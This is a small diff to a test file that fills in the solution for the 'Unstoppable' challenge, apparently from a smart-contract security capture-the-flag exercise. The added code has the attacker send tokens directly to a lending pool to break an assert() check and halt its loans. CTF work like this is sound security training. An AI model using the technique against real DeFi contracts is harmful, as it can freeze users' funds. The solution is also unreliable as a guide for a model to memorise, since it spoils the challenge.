@@ -47,6 +47,9 @@ describe("[Challenge] Unstoppable", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // deposit tokens directly into pool will cause assert() fail
+        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther("1"))
     })
 
     after(async function () {
